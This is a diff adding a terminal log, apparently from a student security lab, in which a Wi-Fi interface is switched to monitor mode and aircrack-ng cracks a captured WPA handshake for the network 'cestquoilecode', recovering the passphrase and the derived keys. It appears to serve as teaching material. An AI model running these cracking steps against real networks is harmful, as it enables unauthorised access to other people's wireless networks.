@@ -1,0 +1,53 @@
+[root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 down 
+[root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iwconfig wlp0s20f0u1u1u2 mode monitor
+[root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 up
+[root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iw wlp0s20f0u1u1u2 set channel 5 HT40+
+[root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# exit
+exit
+[slaynpool@MiniZbeub]manip$ aircrack-ng -w dico.txt vendredi.pcap 
+Reading packets, please wait...
+Opening vendredi.pcap
+Read 4019 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:3A:9A:20:E8:20                            Unknown
+   2  00:3A:9A:20:E8:23                            Unknown
+   3  00:3A:9A:20:E8:25  eduroam                   Unknown
+   4  00:3A:9A:20:E8:26                            Unknown
+   5  00:3A:9A:24:58:E0                            Unknown
+   6  00:3A:9A:24:58:E3                            Unknown
+   7  24:0A:C4:1D:1A:59  xxxxxxxx                  Unknown
+   8  24:0A:C4:1D:1C:25  MonitorME                 Unknown
+   9  24:0A:C4:1D:1D:89  TPSECOC                   Unknown
+  10  24:0A:C4:1D:2B:39  cestquoilecode            WPA (1 handshake)
+
+Index number of target network ? 10
+
+Reading packets, please wait...
+Opening vendredi.pcap
+Read 4019 packets.
+
+1 potential targets
+
+
+
+                         Aircrack-ng 1.6 rev e708c21e
+
+      [00:00:25] 221032/1814400 keys tested (8838.02 k/s) 
+
+      Time left: 3 minutes, 0 seconds                           12.18%
+
+                           KEY FOUND! [ 13456789 ]
+
+
+      Master Key     : 58 16 83 73 96 C7 C9 87 F6 1B 01 43 7B C7 D8 66 
+                       CC DD 45 07 76 C9 DD 91 81 3E FF 87 EE EE 6F 75 
+
+      Transient Key  : D8 E4 42 04 60 18 D4 99 68 33 D0 7B 9F 68 E3 1C 
+                       E5 5D 71 92 E1 E9 7D 7D 06 F6 3E 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : C7 FF 55 33 0D 2A 83 28 D2 F6 52 BF C3 3C 86 D7 
+
